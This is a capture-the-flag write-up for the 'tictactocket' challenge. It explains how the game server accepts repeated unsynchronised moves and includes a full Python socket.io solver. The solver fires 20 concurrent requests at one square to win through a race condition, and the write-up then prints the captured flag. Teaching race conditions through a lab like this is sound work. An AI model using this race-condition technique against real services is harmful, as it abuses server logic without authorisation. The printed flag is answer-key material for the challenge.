## tictactocket [400]
In this challenge, we are presented with a tic-tac-toe game, and we are required to win to get the flag. Since the computer plays very well, we can exploit an overwrite section in the game because there is no request handling to prevent repeated requests in certain sections. Below is the solver code.

### Solver Code
```python
import socketio
import threading
import time

# Initialize socket.io client
sio = socketio.Client()

# Game ID will be stored here after starting a new game
game_id = None

# Function to handle connection
@sio.event
def connect():
    print("Connected to server")
    # Send event to start a new game
    sio.emit('client_new_game')

# Function to handle new game start from the server
@sio.on('server_new_game')
def on_new_game(data):
    global game_id
    print(f'Data from server_new_game: {data}')
    game_id = data['game_id']
    print(f"New game started with ID: {game_id}")
    print("Waiting for your turn to start...")

# Function to place a move on a specific square
def place_square(square):
    if game_id is not None:
        sio.emit('client_place_square', {'game_id': game_id, 'square': square})
        print(f"Selecting square {square}")

# Function to update the game board after each move
@sio.on('server_board_update')
def on_board_update(data):
    # Display board status
    board = ["X" if x == 0 else "O" if x == 1 else " " for x in data['board']]
    for i in range(0, 9, 3):
        print(f"{board[i]} | {board[i+1]} | {board[i+2]}")
    
    # Check turn or game result
    if data['winner'] == 0:
        print(f"Flag: {data['flag']}")
        print("You won! You might have obtained the flag.")
    elif data['winner'] == 1:
        print("You lost...")
    elif data['winner'] == 3:
        print("It's a draw.")
    elif data['turn'] == 0:  # Player's turn
        print("Your turn")
        perform_user_moves()  # Request user input if it's the player's turn

# Function to request user moves
def perform_user_moves():
    try:
        # First move
        square = int(input("Choose the first square (0-8): "))
        if square == 2:
            print("Starting race condition...")
            attempt_race_condition()  # Using race condition if user inputs 2
            return
        place_square(square)
        time.sleep(1)  # Short delay to allow server to process the first move

        # Second move
        square = int(input("Choose the second square (0-8): "))
        if square == 2:
            print("Starting race condition...")
            attempt_race_condition()  # Using race condition if user inputs 2
            return
        place_square(square)
        time.sleep(1)  # Short delay before the third move

        # Third move
        square = int(input("Choose the third square or enter '2' to start race condition: "))
        if square == 2:
            print("Starting race condition on the third move...")
            attempt_race_condition()  # Using race condition on the third move
        else:
            place_square(square)
    except ValueError:
        print("Invalid input, please enter a number between 0-8.")

# Function to perform race condition on the third move
def attempt_race_condition():
    # Select the target square to manipulate for race condition
    target_square = 2

    # Send multiple threads to the same square to trigger race condition
    threads = []
    for i in range(20):  # Increase thread count to improve race condition probability
        t = threading.Thread(target=place_square, args=(target_square,))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

# Function to handle disconnection
@sio.event
def disconnect():
    print("Disconnected from server")

# Connect to the server
sio.connect('https://usc-tictactocket.chals.io', wait_timeout=10)

# Remain active until the game is finished
sio.wait()
```
To run the code, input like the following: 0, 1, 2, and you should get the flag.
```
CYBORG{S3RVER_W45_0VERTRUST1NG}
```

